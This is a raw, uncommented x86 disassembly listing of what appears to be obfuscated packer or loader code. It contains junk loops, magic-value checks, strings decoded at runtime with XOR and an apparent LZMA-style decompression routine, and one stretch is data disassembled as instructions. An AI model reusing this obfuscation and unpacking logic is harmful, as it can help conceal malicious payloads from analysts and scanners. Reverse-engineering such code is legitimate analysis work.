  423e82:	mov    eax,DWORD PTR [ebp+0x8]
  423e85:	jmp    0x423e91
  423e8a:	mov    eax,DWORD PTR [ebp-0x4]
  423e8d:	xor    eax,ecx
  423e8f:	add    eax,edx
  423e91:	leave  
  423e92:	ret    0x4
  423e95:	push   ebp
  423e96:	mov    ebp,esp
  423e98:	sub    esp,0xc
  423e9b:	push   esi
  423e9c:	or     DWORD PTR ds:0x428eaf,ebx
  423ea2:	mov    esi,0xf89c85a5
  423ea7:	and    DWORD PTR ds:0x428e97,0x0
  423eb1:	jmp    0x423ec3
  423eb6:	mov    edx,DWORD PTR ds:0x428e97
  423ebc:	inc    edx
  423ebd:	mov    DWORD PTR ds:0x428e97,edx
  423ec3:	cmp    DWORD PTR ds:0x428e97,0x10
  423eca:	jae    0x423f0a
  423ed0:	cmp    DWORD PTR ds:0x428e97,0x8
  423ed7:	jg     0x423f0a
  423edd:	jmp    0x423eeb
  423ee2:	push   DWORD PTR [ebp-0x20]
  423ee5:	call   DWORD PTR ds:0x42a9eb
  423eeb:	cmp    DWORD PTR ds:0x428e97,0x7
  423ef2:	jne    0x423f05
  423ef8:	mov    edx,DWORD PTR ds:0x428e97
  423efe:	inc    edx
  423eff:	mov    DWORD PTR ds:0x428e97,edx
  423f05:	jmp    0x423eb6
  423f0a:	mov    DWORD PTR [ebp-0x8],esi
  423f0d:	and    DWORD PTR ds:0x428e67,0x0
  423f17:	jmp    0x423f29
  423f1c:	mov    edx,DWORD PTR ds:0x428e67
  423f22:	inc    edx
  423f23:	mov    DWORD PTR ds:0x428e67,edx
  423f29:	cmp    DWORD PTR ds:0x428e67,0x1a
  423f30:	jae    0x423f78
  423f36:	cmp    DWORD PTR ds:0x428e67,0x4
  423f3d:	jle    0x423f78
  423f43:	jmp    0x423f59
  423f48:	push   DWORD PTR [ebp-0x18]
  423f4b:	push   0x428e67
  423f50:	push   DWORD PTR [ebp-0x18]
  423f53:	call   DWORD PTR ds:0x42a9ef
  423f59:	cmp    DWORD PTR ds:0x428e67,0x3
  423f60:	jne    0x423f73
  423f66:	mov    edx,DWORD PTR ds:0x428e67
  423f6c:	inc    edx
  423f6d:	mov    DWORD PTR ds:0x428e67,edx
  423f73:	jmp    0x423f1c
  423f78:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  423f7f:	push   edi
  423f80:	adc    DWORD PTR ds:0x428e87,0x34d1
  423f8a:	mov    eax,eax
  423f8c:	mov    eax,DWORD PTR [ebp-0x4]
  423f8f:	movzx  edx,BYTE PTR ds:0x428e97
  423f96:	add    DWORD PTR ds:0x428ecf,edx
  423f9c:	mov    edi,DWORD PTR [ebp-0x8]
  423f9f:	mov    ecx,DWORD PTR ds:0x429767
  423fa5:	mov    ecx,DWORD PTR [ecx]
  423fa7:	sub    DWORD PTR ds:0x428ecb,ecx
  423fad:	mov    ecx,0x75108af
  423fb2:	xor    eax,ecx
  423fb4:	xor    edi,ecx
  423fb6:	mov    edx,0x3272f6
  423fbb:	add    edi,edx
  423fbd:	add    eax,edx
  423fbf:	imul   eax,edi
  423fc2:	mov    edi,DWORD PTR [ebp+0xc]
  423fc5:	cmp    edi,eax
  423fc7:	je     0x42401c
  423fcd:	mov    DWORD PTR [ebp-0xc],esi
  423fd0:	mov    eax,DWORD PTR [ebp-0xc]
  423fd3:	mov    esi,DWORD PTR [ebp+0xc]
  423fd6:	xor    eax,ecx
  423fd8:	lea    eax,[eax*8+0x1939828]
  423fdf:	mov    eax,DWORD PTR [esi+eax*1]
  423fe2:	mov    DWORD PTR [ebp+0xc],eax
  423fe5:	mov    eax,DWORD PTR [ebp-0x4]
  423fe8:	mov    esi,DWORD PTR [ebp-0x8]
  423feb:	xor    eax,ecx
  423fed:	xor    esi,ecx
  423fef:	add    esi,edx
  423ff1:	add    eax,edx
  423ff3:	imul   eax,esi
  423ff6:	mov    esi,DWORD PTR [ebp+0xc]
  423ff9:	cmp    esi,eax
  423ffb:	je     0x42401c
  424001:	mov    eax,DWORD PTR [ebp-0x4]
  424004:	xor    eax,ecx
  424006:	mov    ecx,DWORD PTR [ebp+0xc]
  424009:	add    eax,edx
  42400b:	imul   eax,ecx
  42400e:	add    eax,DWORD PTR [ebp+0x8]
  424011:	mov    DWORD PTR [ebp+0xc],eax
  424014:	mov    eax,DWORD PTR [ebp+0xc]
  424017:	jmp    0x42402d
  42401c:	mov    eax,DWORD PTR [ebp-0x4]
  42401f:	mov    esi,DWORD PTR [ebp-0x8]
  424022:	xor    esi,ecx
  424024:	xor    eax,ecx
  424026:	add    esi,edx
  424028:	add    eax,edx
  42402a:	imul   eax,esi
  42402d:	pop    edi
  42402e:	pop    esi
  42402f:	leave  
  424030:	ret    0x8
	...
  424043:	add    BYTE PTR [ebp-0x44],al
  424046:	mov    edi,0x4d
  42404b:	add    BYTE PTR [edx],al
  42404d:	add    BYTE PTR [eax],al
  42404f:	add    BYTE PTR [ecx+0x0],al
  424052:	add    BYTE PTR [eax],al
  424054:	pusha  
  424055:	inc    eax
  424056:	add    al,BYTE PTR [eax]
  424058:	pusha  
  424059:	xor    al,0x2
  42405b:	add    BYTE PTR [eax],al
  42405d:	add    BYTE PTR [eax],al
  42405f:	add    BYTE PTR [edx+0x53],dl
  424062:	inc    esp
  424063:	push   ebx
  424064:	pop    eax
  424065:	and    ebp,DWORD PTR [ebx]
  424067:	popf   
  424068:	mov    edi,0xb24d56fb
  42406d:	cmp    al,0x32
  42406f:	cdq    
  424070:	ja     0x4240d4
  424072:	dec    ebp
  424073:	add    eax,0x1
  424078:	inc    ebx
  424079:	cmp    bl,BYTE PTR [esi+eax*2+0x6f]
  42407d:	ins    BYTE PTR es:[edi],dx
  42407e:	fs gs jb 0x4240a2
  424082:	outs   dx,DWORD PTR ds:[esi]
  424083:	data16 and BYTE PTR [edi+0x6f],dl
  424087:	jb     0x4240f4
  424089:	imul   ebp,DWORD PTR [esi+0x67],0x6f725020
  424090:	push   0x65
  424092:	arpl   WORD PTR [esp+ebx*2+0x50],si
  424096:	jb     0x424107
  424098:	push   0x65
  42409a:	arpl   WORD PTR [esp+edx*2+0x65],si
  42409e:	jae    0x424114
  4240a0:	add    BYTE PTR [ebx-0x137e13ab],cl
  4240a6:	or     BYTE PTR [ecx],al
  4240a8:	add    BYTE PTR [eax],al
  4240aa:	push   ebx
  4240ab:	mov    eax,ebx
  4240ad:	xchg   ecx,eax
  4240ae:	mov    eax,DWORD PTR [ebp+0x8]
  4240b1:	cmp    eax,0xf89c85a5
  4240b6:	jne    0x424542
  4240bc:	mov    eax,DWORD PTR [ebp+0xc]
  4240bf:	cmp    eax,0xf89c85a4
  4240c4:	jne    0x424542
  4240ca:	mov    eax,DWORD PTR [ebp+0x24]
  4240cd:	mov    DWORD PTR [ebp-0x4],eax
  4240d0:	mov    eax,DWORD PTR [ebp-0x4]
  4240d3:	mov    eax,DWORD PTR [eax+0x1d8]
  4240d9:	mov    eax,DWORD PTR [eax]
  4240db:	mov    eax,DWORD PTR [eax]
  4240dd:	mov    DWORD PTR [ebp-0x8],eax
  4240e0:	mov    BYTE PTR [ebp-0x18],0x1c
  4240e4:	mov    BYTE PTR [ebp-0x17],0x1f
  4240e8:	mov    BYTE PTR [ebp-0x16],0x1a
  4240ec:	mov    BYTE PTR [ebp-0x15],0x50
  4240f0:	mov    BYTE PTR [ebp-0x14],0x51
  4240f4:	mov    BYTE PTR [ebp-0x13],0x83
  4240f8:	mov    BYTE PTR [ebp-0x20],0xe
  4240fc:	mov    BYTE PTR [ebp-0x1f],0x10
  424100:	mov    BYTE PTR [ebp-0x1e],0x1e
  424104:	mov    BYTE PTR [ebp-0x1d],0x11
  424108:	mov    BYTE PTR [ebp-0x1c],0x50
  42410c:	mov    BYTE PTR [ebp-0x1b],0x51
  424110:	mov    BYTE PTR [ebp-0x1a],0x83
  424114:	mov    BYTE PTR [ebp-0x28],0x10
  424118:	mov    BYTE PTR [ebp-0x27],0x1b
  42411c:	mov    BYTE PTR [ebp-0x26],0x17
  424120:	mov    BYTE PTR [ebp-0x25],0xc
  424124:	mov    BYTE PTR [ebp-0x24],0x22
  424128:	mov    BYTE PTR [ebp-0x23],0x13
  42412c:	mov    BYTE PTR [ebp-0x22],0x1a
  424130:	mov    BYTE PTR [ebp-0x21],0x83
  424134:	xor    ecx,ecx
  424136:	lea    eax,[ebp+ecx*1-0x18]
  42413a:	movzx  edx,BYTE PTR [eax]
  42413d:	xor    edx,0x7f
  424140:	add    edx,0x4
  424143:	inc    ecx
  424144:	mov    BYTE PTR [eax],dl
  424146:	cmp    ecx,0x6
  424149:	jb     0x424136
  42414b:	xor    ecx,ecx
  42414d:	lea    eax,[ebp+ecx*1-0x20]
  424151:	movzx  edx,BYTE PTR [eax]
  424154:	xor    edx,0x7f
  424157:	add    edx,0x4
  42415a:	inc    ecx
  42415b:	mov    BYTE PTR [eax],dl
  42415d:	cmp    ecx,0x7
  424160:	jb     0x42414d
  424162:	xor    ecx,ecx
  424164:	lea    eax,[ebp+ecx*1-0x28]
  424168:	movzx  edx,BYTE PTR [eax]
  42416b:	xor    edx,0x7f
  42416e:	add    edx,0x4
  424171:	inc    ecx
  424172:	mov    BYTE PTR [eax],dl
  424174:	cmp    ecx,0x8
  424177:	jb     0x424164
  424179:	lea    eax,[ebp-0x2c]
  42417c:	mov    DWORD PTR [ebp-0x8],eax
  42417f:	mov    ecx,DWORD PTR [ebp-0x8]
  424182:	mov    eax,0x7113fccf
  424187:	push   esi
  424188:	mov    DWORD PTR [ecx],eax
  42418a:	mov    ecx,DWORD PTR [ebp-0x2c]
  42418d:	mov    esi,0x4e38
  424192:	push   edi
  424193:	lea    edi,[esi-0x6]
  424196:	mov    ebx,0x3272f6
  42419b:	cmp    ecx,eax
  42419d:	jne    0x42426e
  4241a3:	lea    eax,[esi+0x3f]
  4241a6:	mov    WORD PTR [ebp-0x78],ax
  4241aa:	mov    eax,esi
  4241ac:	mov    WORD PTR [ebp-0x76],ax
  4241b0:	add    eax,0x45
  4241b3:	mov    WORD PTR [ebp-0x74],ax
  4241b7:	lea    eax,[esi+0x6]
  4241ba:	mov    WORD PTR [ebp-0x72],ax
  4241be:	add    eax,0x41
  4241c1:	mov    WORD PTR [ebp-0x70],ax
  4241c5:	mov    eax,edi
  4241c7:	mov    WORD PTR [ebp-0x6e],ax
  4241cb:	mov    eax,0x4f94
  4241d0:	mov    WORD PTR [ebp-0x6c],ax
  4241d4:	lea    eax,[esi-0x7]
  4241d7:	mov    WORD PTR [ebp-0x6a],ax
  4241db:	add    eax,0x30
  4241de:	mov    WORD PTR [ebp-0x68],ax
  4241e2:	lea    eax,[esi-0x3]
  4241e5:	mov    WORD PTR [ebp-0x66],ax
  4241e9:	mov    eax,esi
  4241eb:	mov    WORD PTR [ebp-0x64],ax
  4241ef:	add    eax,0xfffffffc
  4241f2:	mov    WORD PTR [ebp-0x62],ax
  4241f6:	mov    eax,0x443
  4241fb:	mov    WORD PTR [ebp-0x60],ax
  4241ff:	mov    eax,0x5672
  424204:	mov    WORD PTR [ebp-0x5e],ax
  424208:	mov    eax,0x6112
  42420d:	mov    WORD PTR [ebp-0x5c],ax
  424211:	mov    eax,0xf1e0
  424216:	mov    WORD PTR [ebp-0x5a],ax
  42421a:	mov    eax,edi
  42421c:	mov    WORD PTR [ebp-0x58],ax
  424220:	lea    eax,[ebp-0xe0]
  424226:	push   eax
  424227:	mov    eax,DWORD PTR [ebp+0xc]
  42422a:	xor    eax,0x75108af
  42422f:	add    eax,ebx
  424231:	push   eax
  424232:	lea    eax,[ebp-0x78]
  424235:	push   eax
  424236:	mov    eax,DWORD PTR [ebp-0x4]
  424239:	mov    eax,DWORD PTR [eax+0x198]
  42423f:	mov    DWORD PTR [ebp-0xe0],0x1
  424249:	mov    DWORD PTR [ebp-0xdc],0xffff
  424253:	push   DWORD PTR [eax]
  424255:	mov    eax,DWORD PTR [ebp+0x10]
  424258:	call   eax
  42425a:	mov    DWORD PTR [ebp-0x8],eax
  42425d:	mov    eax,DWORD PTR [ebp-0x8]
  424260:	test   eax,eax
  424262:	je     0x42426e
  424264:	xor    DWORD PTR ds:0xe041cc1,0x9f170bd0
  42426e:	mov    eax,DWORD PTR [ebp-0x4]
  424271:	mov    ecx,DWORD PTR [eax+0x18c]
  424277:	xor    eax,eax
  424279:	cmp    DWORD PTR [ecx],eax
  42427b:	jne    0x4244b2
  424281:	mov    ecx,DWORD PTR [ebp-0x4]
  424284:	mov    ecx,DWORD PTR [ecx+0x17c]
  42428a:	mov    DWORD PTR [ecx],eax
  42428c:	mov    ecx,DWORD PTR [ebp-0x4]
  42428f:	mov    ecx,DWORD PTR [ecx+0x180]
  424295:	mov    DWORD PTR [ecx],eax
  424297:	mov    eax,0x4e6d
  42429c:	mov    WORD PTR [ebp-0x9c],ax
  4242a3:	mov    eax,esi
  4242a5:	mov    WORD PTR [ebp-0x9a],ax
  4242ac:	mov    eax,0x4e7d
  4242b1:	mov    WORD PTR [ebp-0x98],ax
  4242b8:	add    eax,0xffffffc0
  4242bb:	mov    WORD PTR [ebp-0x96],ax
  4242c2:	mov    eax,0x4f88
  4242c7:	mov    WORD PTR [ebp-0x94],ax
  4242ce:	mov    eax,0x4e3c
  4242d3:	mov    WORD PTR [ebp-0x92],ax
  4242da:	mov    eax,esi
  4242dc:	mov    WORD PTR [ebp-0x8c],ax
  4242e3:	mov    eax,0x4e31
  4242e8:	mov    WORD PTR [ebp-0x8a],ax
  4242ef:	mov    eax,0x99fd
  4242f4:	mov    WORD PTR [ebp-0x88],ax
  4242fb:	mov    eax,0x8d6c
  424300:	mov    WORD PTR [ebp-0x86],ax
  424307:	mov    eax,0xd66f
  42430c:	mov    WORD PTR [ebp-0x84],ax
  424313:	mov    BYTE PTR [ebp-0x10],0x10
  424317:	mov    eax,0xd783
  42431c:	mov    WORD PTR [ebp-0x82],ax
  424323:	mov    BYTE PTR [ebp-0xf],0x1b
  424327:	mov    eax,0x2782
  42432c:	mov    BYTE PTR [ebp-0xe],0x17
  424330:	mov    WORD PTR [ebp-0x80],ax
  424334:	mov    BYTE PTR [ebp-0xd],0xc
  424338:	mov    eax,0x4782
  42433d:	mov    BYTE PTR [ebp-0xc],0x22
  424341:	mov    WORD PTR [ebp-0x7e],ax
  424345:	mov    eax,0x4e33
  42434a:	mov    BYTE PTR [ebp-0xb],0x13
  42434e:	push   0x8
  424350:	mov    BYTE PTR [ebp-0xa],0x1a
  424354:	mov    WORD PTR [ebp-0x7c],ax
  424358:	mov    BYTE PTR [ebp-0x9],0x83
  42435c:	mov    DWORD PTR [ebp-0x90],0x4e324e61
  424366:	lea    eax,[ebp-0x10]
  424369:	pop    edi
  42436a:	movzx  ecx,BYTE PTR [eax]
  42436d:	xor    ecx,0x7f
  424370:	add    ecx,0x4
  424373:	mov    BYTE PTR [eax],cl
  424375:	inc    eax
  424376:	dec    edi
  424377:	jne    0x42436a
  424379:	mov    DWORD PTR [ebp-0xe0],0x1
  424383:	lea    eax,[ebp-0x10]
  424386:	mov    DWORD PTR [ebp-0xdc],eax
  42438c:	mov    ecx,0x4e60
  424391:	mov    eax,ecx
  424393:	mov    WORD PTR [ebp-0x40],ax
  424397:	add    eax,0xb
  42439a:	mov    edx,eax
  42439c:	mov    WORD PTR [ebp-0x3e],dx
  4243a0:	mov    edx,0x4f93
  4243a5:	mov    WORD PTR [ebp-0x3c],dx
  4243a9:	add    edx,0xfffffff8
  4243ac:	mov    WORD PTR [ebp-0x3a],dx
  4243b0:	mov    edx,0x4f89
  4243b5:	mov    WORD PTR [ebp-0x38],dx
  4243b9:	add    edx,0x5
  4243bc:	mov    WORD PTR [ebp-0x36],dx
  4243c0:	mov    edx,0x4f87
  4243c5:	mov    WORD PTR [ebp-0x34],dx
  4243c9:	mov    WORD PTR [ebp-0x32],cx
  4243cd:	mov    ecx,esi
  4243cf:	mov    WORD PTR [ebp-0x30],cx
  4243d3:	lea    ecx,[edx-0x7]
  4243d6:	mov    edx,ecx
  4243d8:	mov    WORD PTR [ebp-0x54],dx
  4243dc:	mov    edx,eax
  4243de:	mov    WORD PTR [ebp-0x52],dx
  4243e2:	mov    edx,0x4e73
  4243e7:	mov    WORD PTR [ebp-0x50],dx
  4243eb:	mov    WORD PTR [ebp-0x4e],ax
  4243ef:	lea    eax,[edx-0xa]
  4243f2:	mov    WORD PTR [ebp-0x4c],ax
  4243f6:	add    eax,0x5
  4243f9:	mov    WORD PTR [ebp-0x4a],ax
  4243fd:	lea    eax,[edx-0xc]
  424400:	mov    WORD PTR [ebp-0x48],ax
  424404:	mov    WORD PTR [ebp-0x46],cx
  424408:	mov    WORD PTR [ebp-0x44],si
  42440c:	mov    ecx,DWORD PTR [ebp+0x8]
  42440f:	movzx  edx,WORD PTR [ebp-0x54]
  424413:	mov    eax,0x75108af
  424418:	xor    ecx,eax
  42441a:	add    ecx,ebx
  42441c:	xor    ecx,edx
  42441e:	mov    WORD PTR [ebp-0x54],cx
  424422:	mov    ecx,DWORD PTR [ebp+0x8]
  424425:	xor    ecx,eax
  424427:	movzx  eax,WORD PTR [ebp-0x40]
  42442b:	add    ecx,ebx
  42442d:	xor    ecx,eax
  42442f:	xor    eax,eax
  424431:	mov    WORD PTR [ebp-0x40],cx
  424435:	mov    WORD PTR [ebp-0xf4],ax
  42443c:	mov    WORD PTR [ebp-0x108],ax
  424443:	mov    edi,DWORD PTR [ebp+0x24]
  424446:	lea    eax,[ebp-0xf4]
  42444c:	lea    edx,[ebp-0x54]
  42444f:	mov    DWORD PTR [ebp-0xe0],0x2
  424459:	mov    DWORD PTR [ebp-0xdc],eax
  42445f:	call   0x426ea1
  424464:	mov    ecx,DWORD PTR [ebp+0x8]
  424467:	mov    DWORD PTR [ebp-0xd8],eax
  42446d:	mov    eax,0x75108af
  424472:	xor    ecx,eax
  424474:	add    ecx,ebx
  424476:	je     0x424495
  424478:	lea    ecx,[ebp-0xe0]
  42447e:	push   ecx
  42447f:	mov    ecx,DWORD PTR [ebp+0xc]
  424482:	xor    ecx,eax
  424484:	add    ecx,ebx
  424486:	push   ecx
  424487:	lea    eax,[ebp-0x9c]
  42448d:	push   eax
  42448e:	mov    eax,DWORD PTR [ebp+0x10]
  424491:	push   0x0
  424493:	call   eax
  424495:	mov    edi,DWORD PTR [ebp+0x24]
  424498:	lea    eax,[ebp-0x108]
  42449e:	lea    edx,[ebp-0x40]
  4244a1:	mov    DWORD PTR [ebp-0xdc],eax
  4244a7:	call   0x426ea1
  4244ac:	mov    DWORD PTR [ebp-0xd8],eax
  4244b2:	mov    eax,DWORD PTR [ebp+0x14]
  4244b5:	push   DWORD PTR [ebp-0x4]
  4244b8:	push   DWORD PTR [ebp+0x20]
  4244bb:	push   DWORD PTR [ebp+0x1c]
  4244be:	push   DWORD PTR [ebp+0x18]
  4244c1:	push   DWORD PTR [ebp+0x10]
  4244c4:	push   DWORD PTR [ebp+0x8]
  4244c7:	push   DWORD PTR [ebp+0xc]
  4244ca:	call   0x425742
  4244cf:	test   eax,eax
  4244d1:	je     0x424518
  4244d3:	add    DWORD PTR [ebp-0x4],eax
  4244d6:	push   DWORD PTR [ebp-0x4]
  4244d9:	lea    esi,[ebp+0x4]
  4244dc:	call   0x424930
  4244e1:	mov    eax,DWORD PTR [ebp-0x4]
  4244e4:	mov    eax,DWORD PTR [eax+0x1c8]
  4244ea:	mov    eax,DWORD PTR [eax]
  4244ec:	xor    eax,0x75108af
  4244f1:	add    eax,ebx
  4244f3:	mov    eax,DWORD PTR [ebp-0x4]
  4244f6:	jne    0x42450e
  4244f8:	mov    ecx,DWORD PTR [ebp-0x4]
  4244fb:	mov    ecx,DWORD PTR [ecx+0x1cc]
  424501:	push   DWORD PTR [ecx]
  424503:	mov    eax,DWORD PTR [eax+0x1e0]
  424509:	call   DWORD PTR [eax+0x28]
  42450c:	jmp    0x424518
  42450e:	mov    eax,DWORD PTR [eax+0x17c]
  424514:	mov    eax,DWORD PTR [eax]
  424516:	add    DWORD PTR [esi],eax
  424518:	mov    eax,DWORD PTR [ebp-0x4]
  42451b:	mov    eax,DWORD PTR [eax+0x1dc]
  424521:	dec    DWORD PTR [eax]
  424523:	mov    ecx,DWORD PTR [ebp-0x4]
  424526:	mov    ecx,DWORD PTR [ecx+0x1d8]
  42452c:	mov    eax,DWORD PTR [eax]
  42452e:	lea    eax,[ecx+eax*4]
  424531:	mov    ecx,DWORD PTR [ebp-0x4]
  424534:	mov    ecx,DWORD PTR [ecx+0x17c]
  42453a:	mov    eax,DWORD PTR [eax]
  42453c:	mov    ecx,DWORD PTR [ecx]
  42453e:	add    DWORD PTR [eax],ecx
  424540:	pop    edi
  424541:	pop    esi
  424542:	pop    ebx
  424543:	leave  
  424544:	ret    0x20
  424547:	push   edi
  424548:	push   esi
  424549:	push   ebx
  42454a:	push   ebp
  42454b:	mov    ebp,esp
  42454d:	mov    eax,DWORD PTR [ebp+0x24]
  424550:	add    DWORD PTR [ebp+0x28],eax
  424553:	push   eax
  424554:	cld    
  424555:	mov    esi,DWORD PTR [ebp+0x18]
  424558:	add    DWORD PTR [ebp+0x1c],esi
  42455b:	push   esi
  42455c:	mov    esi,DWORD PTR [ebp+0x14]
  42455f:	lods   eax,DWORD PTR ds:[esi]
  424560:	xchg   edx,eax
  424561:	push   edx
  424562:	mov    cl,BYTE PTR [esi-0x2]
  424565:	or     eax,0xffffffff
  424568:	shl    eax,cl
  42456a:	not    eax
  42456c:	push   eax
  42456d:	mov    cl,dh
  42456f:	or     eax,0xffffffff
  424572:	shl    eax,cl
  424574:	not    eax
  424576:	push   eax
  424577:	add    cl,dl
  424579:	mov    edi,esi
  42457b:	sub    esp,0xc
  42457e:	sub    eax,eax
  424580:	inc    eax
  424581:	push   eax
  424582:	push   eax
  424583:	push   eax
  424584:	push   eax
  424585:	push   eax
  424586:	push   edi
  424587:	sub    esi,esi
  424589:	push   esi
  42458a:	or     ebx,0xffffffff
  42458d:	mov    eax,0x300
  424592:	shl    eax,cl
  424594:	lea    ecx,[eax+0x736]
  42459a:	mov    eax,0x4000400
  42459f:	shr    ecx,1
  4245a1:	rep stos DWORD PTR es:[edi],eax
  4245a3:	push   0x5
  4245a5:	pop    ecx
  4245a6:	call   0x424891
  4245ab:	loop   0x4245a6
  4245ad:	lea    esi,[esi]
  4245af:	lea    edi,[edi]
  4245b1:	mov    edi,DWORD PTR [ebp-0x4]
  4245b4:	mov    eax,DWORD PTR [ebp-0x10]
  4245b7:	sub    edi,DWORD PTR [ebp+0x24]
  4245ba:	and    eax,edi
  4245bc:	mov    DWORD PTR [ebp-0x18],eax
  4245bf:	mov    al,0x0
  4245c1:	call   0x4248a9
  4245c6:	jne    0x424661
  4245cc:	mov    cl,BYTE PTR [ebp-0xc]
  4245cf:	and    edi,DWORD PTR [ebp-0x14]
  4245d2:	shl    edi,cl
  4245d4:	sub    cl,0x8
  4245d7:	neg    cl
  4245d9:	shr    esi,cl
  4245db:	pop    eax
  4245dc:	add    edi,esi
  4245de:	pop    esi
  4245df:	lea    edi,[edi+edi*2]
  4245e2:	shl    edi,0x8
  4245e5:	cmp    al,0x7
  4245e7:	pop    edx
  4245e8:	lea    ecx,[esi+edi*2+0xe6c]
  4245ef:	push   ecx
  4245f0:	push   esi
  4245f1:	mov    esi,0x100
  4245f6:	push   eax
  4245f7:	mov    al,0x1
  4245f9:	jb     0x42462f
  4245fb:	mov    edi,DWORD PTR [ebp-0x4]
  4245fe:	sub    edi,DWORD PTR [ebp-0x24]
  424601:	movzx  edi,BYTE PTR [edi]
  424604:	mov    ebp,DWORD PTR [ebp-0x34]
  424607:	shl    edi,1
  424609:	mov    ecx,esi
  42460b:	and    esi,edi
  42460d:	add    ecx,esi
  42460f:	lea    ebp,[ebp+ecx*2+0x0]
  424613:	call   0x4248c8
  424618:	mov    ecx,eax
  42461a:	shr    esi,0x8
  42461d:	and    ecx,0x1
  424620:	cmp    esi,ecx
  424622:	mov    esi,0x100
  424627:	jne    0x424637
  424629:	cmp    eax,esi
  42462b:	jb     0x424604
  42462d:	jmp    0x424643
  42462f:	mov    ebp,DWORD PTR [ebp-0x34]
  424632:	call   0x4248c8
  424637:	inc    eax
  424638:	inc    esi
  424639:	sub    eax,0x1
  42463c:	sub    esi,0x1
  42463f:	cmp    eax,esi
  424641:	jb     0x42462f
  424643:	pop    edx
  424644:	inc    edx
  424645:	cmp    edx,0x5
  424648:	dec    edx
  424649:	mov    ecx,edx
  42464b:	jb     0x42465c
  42464d:	inc    edx
  42464e:	cmp    edx,0xb
  424651:	dec    edx
  424652:	mov    cl,0x4
  424654:	dec    cl
  424656:	jb     0x42465c
  424658:	mov    cl,0x7
  42465a:	dec    cl
  42465c:	sub    edx,ecx
  42465e:	push   edx
  42465f:	jmp    0x4246b0
  424661:	mov    al,0xc1
  424663:	dec    al
  424665:	call   0x4248b9
  42466a:	jne    0x424680
  42466c:	pop    eax
  42466d:	pop    edi
  42466e:	pop    edx
  42466f:	pop    ecx
  424670:	pop    edx
  424671:	pop    ecx
  424672:	push   DWORD PTR [esp]
  424675:	push   ecx
  424676:	push   edx
  424677:	mov    edx,0x664
  42467c:	mov    cl,0x0
  42467e:	jmp    0x4246f3
  424680:	mov    al,0xcd
  424682:	dec    al
  424684:	call   0x4248b9
  424689:	jne    0x4246b9
  42468b:	mov    al,0xf1
  42468d:	dec    al
  42468f:	call   0x4248a9
  424694:	jne    0x4246e9
  424696:	pop    eax
  424697:	cmp    al,0x7
  424699:	mov    al,0x9
  42469b:	jb     0x42469f
  42469d:	mov    al,0xb
  42469f:	push   eax
  4246a0:	mov    esi,DWORD PTR [ebp-0x4]
  4246a3:	sub    esi,DWORD PTR [ebp-0x24]
  4246a6:	cmp    esi,DWORD PTR [ebp+0x24]
  4246a9:	jb     0x424880
  4246af:	lods   al,BYTE PTR ds:[esi]
  4246b0:	mov    edi,DWORD PTR [ebp-0x4]
  4246b3:	stos   BYTE PTR es:[edi],al
  4246b4:	jmp    0x424847
  4246b9:	mov    al,0xd8
  4246bb:	call   0x4248b9
  4246c0:	mov    esi,DWORD PTR [ebp-0x28]
  4246c3:	je     0x4246e0
  4246c5:	mov    al,0xe4
  4246c7:	call   0x4248b9
  4246cc:	mov    esi,DWORD PTR [ebp-0x2c]
  4246cf:	je     0x4246da
  4246d1:	mov    esi,DWORD PTR [ebp-0x30]
  4246d4:	mov    ecx,DWORD PTR [ebp-0x2c]
  4246d7:	mov    DWORD PTR [ebp-0x30],ecx
  4246da:	mov    ecx,DWORD PTR [ebp-0x28]
  4246dd:	mov    DWORD PTR [ebp-0x2c],ecx
  4246e0:	mov    ecx,DWORD PTR [ebp-0x24]
  4246e3:	mov    DWORD PTR [ebp-0x28],ecx
  4246e6:	mov    DWORD PTR [ebp-0x24],esi
  4246e9:	pop    eax
  4246ea:	pop    edi
  4246eb:	pop    ecx
  4246ec:	mov    edx,0xa68
  4246f1:	mov    cl,0x8
  4246f3:	add    edx,edi
  4246f5:	push   edx
  4246f6:	push   edi
  4246f7:	cmp    al,0x7
  4246f9:	mov    al,cl
  4246fb:	jb     0x4246ff
  4246fd:	add    al,0x3
  4246ff:	push   eax
  424700:	mov    ebp,DWORD PTR [ebp-0x34]
  424703:	call   0x4248c6
  424708:	jne    0x42471e
  42470a:	mov    eax,DWORD PTR [ebp-0x18]
  42470d:	mov    edi,DWORD PTR [ebp-0x34]
  424710:	shl    eax,0x3
  424713:	sub    ecx,ecx
  424715:	push   0x8
  424717:	pop    esi
  424718:	lea    edi,[edi+eax*2+0x4]
  42471c:	jmp    0x424753
  42471e:	mov    ebp,DWORD PTR [ebp-0x34]
  424721:	add    ebp,0x2
  424724:	call   0x4248c6
  424729:	jne    0x424743
  42472b:	mov    eax,DWORD PTR [ebp-0x18]
  42472e:	mov    edi,DWORD PTR [ebp-0x34]
  424731:	shl    eax,0x3
  424734:	push   0x8
  424736:	pop    ecx
  424737:	push   0x8
  424739:	pop    esi
  42473a:	lea    edi,[edi+eax*2+0x104]
  424741:	jmp    0x424753
  424743:	mov    edi,0x204
  424748:	add    edi,DWORD PTR [ebp-0x34]
  42474b:	push   0x10
  42474d:	pop    ecx
  42474e:	mov    esi,0x100
  424753:	mov    DWORD PTR [ebp-0x1c],ecx
  424756:	sub    eax,eax
  424758:	inc    eax
  424759:	mov    ebp,edi
  42475b:	call   0x4248c8
  424760:	mov    ecx,eax
  424762:	sub    ecx,esi
  424764:	jb     0x424759
  424766:	add    DWORD PTR [ebp-0x1c],ecx
  424769:	cmp    DWORD PTR [ebp-0x3c],0x4
  42476d:	jae    0x424823
  424773:	add    DWORD PTR [ebp-0x3c],0x7
  424777:	mov    ecx,DWORD PTR [ebp-0x1c]
  42477a:	cmp    ecx,0x4
  42477d:	jb     0x424782
  42477f:	push   0x3
  424781:	pop    ecx
  424782:	mov    edi,DWORD PTR [ebp-0x38]
  424785:	shl    ecx,0x6
  424788:	sub    eax,eax
  42478a:	inc    eax
  42478b:	push   0x40
  42478d:	pop    esi
  42478e:	lea    edi,[edi+ecx*2+0x360]
  424795:	mov    ebp,edi
  424797:	call   0x4248c8
  42479c:	mov    ecx,eax
  42479e:	sub    ecx,esi
  4247a0:	jb     0x424795
  4247a2:	mov    DWORD PTR [ebp-0x18],ecx
  4247a5:	mov    DWORD PTR [ebp-0x24],ecx
  4247a8:	cmp    ecx,0x4
  4247ab:	jb     0x424820
  4247ad:	mov    esi,ecx
  4247af:	and    DWORD PTR [ebp-0x24],0x1
  4247b3:	shr    esi,1
  4247b5:	or     DWORD PTR [ebp-0x24],0x2
  4247b9:	dec    esi
  4247ba:	cmp    ecx,0xe
  4247bd:	jae    0x4247d8
  4247bf:	mov    eax,0x2af
  4247c4:	sub    eax,ecx
